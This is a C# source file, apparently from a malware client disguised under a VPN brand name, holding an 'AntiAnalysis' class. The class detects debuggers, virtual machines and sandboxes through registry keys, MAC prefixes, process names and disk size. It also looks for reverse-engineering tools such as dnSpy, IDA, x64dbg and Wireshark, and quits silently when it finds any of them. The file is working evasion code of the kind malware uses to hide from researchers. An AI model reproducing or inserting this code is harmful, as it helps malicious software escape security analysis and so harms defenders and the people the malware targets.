using System;
using System.Diagnostics;
using System.Net.NetworkInformation;
using System.Runtime.InteropServices;
using mullvad.Client.Config;

namespace mullvad.Client.Core
{
    internal static class AntiAnalysis
    {
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool IsDebuggerPresent();

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CheckRemoteDebuggerPresent(IntPtr hProcess, ref bool isDebuggerPresent);

        [DllImport("ntdll.dll", SetLastError = true)]
        private static extern int NtQueryInformationProcess(IntPtr hProcess, int pic, ref IntPtr pbi, int cb, ref int returnLength);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool CloseHandle(IntPtr hObject);

        [DllImport("kernel32.dll")]
        private static extern IntPtr GetModuleHandle(string lpModuleName);

        internal static void RunChecks()
        {
            if (Settings.AntiDebug && DetectDebugger())
                Environment.Exit(0);

            if (Settings.AntiVirtual && DetectVirtualMachine())
                Environment.Exit(0);

            if (Settings.AntiTamper && DetectAnalysisTool())
                Environment.Exit(0);
        }

        private static bool DetectDebugger()
        {
            if (Debugger.IsAttached)
                return true;

            try { if (IsDebuggerPresent()) return true; } catch { }

            try
            {
                bool remote = false;
                CheckRemoteDebuggerPresent(Process.GetCurrentProcess().Handle, ref remote);
                if (remote) return true;
            }
            catch { }

            try
            {
                IntPtr debugPort = IntPtr.Zero;
                int retLen = 0;
                int status = NtQueryInformationProcess(
                    Process.GetCurrentProcess().Handle, 0x07,
                    ref debugPort, IntPtr.Size, ref retLen);
                if (status == 0 && debugPort != IntPtr.Zero)
                    return true;
            }
            catch { }

            try { CloseHandle(IntPtr.Zero); }
            catch { return true; }

            try
            {
                long t0 = Environment.TickCount;
                for (int i = 0; i < 1000; i++) { }
                long elapsed = Environment.TickCount - t0;
                if (elapsed > 100) return true;
            }
            catch { }

            return false;
        }

        private static bool DetectVirtualMachine()
        {
            string[] vmKeys =
            {
                @"SOFTWARE\VMware, Inc.\VMware Tools",
                @"SOFTWARE\Oracle\VirtualBox Guest Additions",
                @"SOFTWARE\Microsoft\Virtual Machine\Guest\Parameters",
                @"SYSTEM\CurrentControlSet\Services\VBoxSF",
                @"SYSTEM\CurrentControlSet\Services\VBoxGuest",
                @"SYSTEM\CurrentControlSet\Services\vmhgfs",
                @"SYSTEM\CurrentControlSet\Services\vmmouse",
                @"SYSTEM\CurrentControlSet\Services\vmusrvc",
                @"SYSTEM\CurrentControlSet\Services\vmci",
                @"SYSTEM\CurrentControlSet\Services\VBoxMouse",
            };

            foreach (var key in vmKeys)
            {
                try
                {
                    using (var rk = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(key))
                        if (rk != null) return true;
                }
                catch { }
            }

            string[] vmMacPrefixes =
            {
                "000569", "000C29", "001C14", "005056",
                "080027", "0A0027",
                "000D3A", "000F4B", "00155D", "0003FF",
                "001C42",
                "525400",
            };

            try
            {
                foreach (var nic in NetworkInterface.GetAllNetworkInterfaces())
                {
                    string mac = nic.GetPhysicalAddress().ToString().ToUpper();
                    if (mac.Length >= 6)
                    {
                        string prefix = mac.Substring(0, 6);
                        foreach (var vm in vmMacPrefixes)
                            if (prefix == vm) return true;
                    }
                }
            }
            catch { }

            string[] vmProcesses =
            {
                "vmtoolsd", "vmwaretray", "vmwareuser", "vmacthlp",
                "vboxservice", "vboxtray", "vboxcontrol",
                "vmsrvc", "vmusrvc", "xenservice", "qemu-ga",
                "prl_tools", "prl_cc",
            };

            try
            {
                foreach (var proc in Process.GetProcesses())
                {
                    try
                    {
                        string name = proc.ProcessName.ToLowerInvariant();
                        foreach (var vm in vmProcesses)
                            if (name == vm) return true;
                    }
                    catch { }
                }
            }
            catch { }

            try
            {
                var drive = new System.IO.DriveInfo("C");
                if (drive.TotalSize < 60L * 1024 * 1024 * 1024)
                    return true;
            }
            catch { }

            return false;
        }

        private static bool DetectAnalysisTool()
        {
            string[] tools =
            {
                "processhacker", "procexp", "procexp64", "procmon", "procmon64",
                "wireshark", "fiddler", "httpanalyzer", "charles", "httpdebugger",
                "ollydbg", "x64dbg", "x32dbg", "windbg",
                "dnspy", "de4dot", "ilspy", "dotpeek", "reflexil", "justdecompile",
                "ida", "ida64", "radare2", "ghidra", "cutter",
                "regmon", "filemon", "apimonitor", "apimonitor-x64",
                "autoruns", "autorunsc", "pestudio", "die",
            };

            try
            {
                foreach (var proc in Process.GetProcesses())
                {
                    try
                    {
                        string name = proc.ProcessName.ToLowerInvariant();
                        foreach (var tool in tools)
                            if (name.Contains(tool)) return true;
                    }
                    catch { }
                }
            }
            catch { }

            try
            {
                string[] debugModules = { "SbieDll", "dbghelp", "api_log", "dir_watch", "snxhk" };
                foreach (var mod in debugModules)
                {
                    if (GetModuleHandle(mod) != IntPtr.Zero)
                        return true;
                }
            }
            catch { }

            return false;
        }
    }
}
